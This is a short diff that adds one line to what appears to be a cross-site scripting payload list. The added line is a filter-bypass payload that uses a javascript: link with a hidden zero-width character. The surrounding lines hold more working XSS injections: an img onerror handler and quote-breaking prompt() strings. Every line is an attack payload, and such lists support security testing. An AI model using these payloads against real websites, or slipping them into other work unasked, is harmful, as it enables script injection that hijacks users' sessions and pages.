@@ -1,3 +1,4 @@
+'<00 foo="<a%20href="javascript​:alert('XSS-Bypass')">XSS-CLick</00>--%20/
 "><img src =q onerror=prompt(8)>
 "-prompt(8)-"
 '-prompt(8)-'
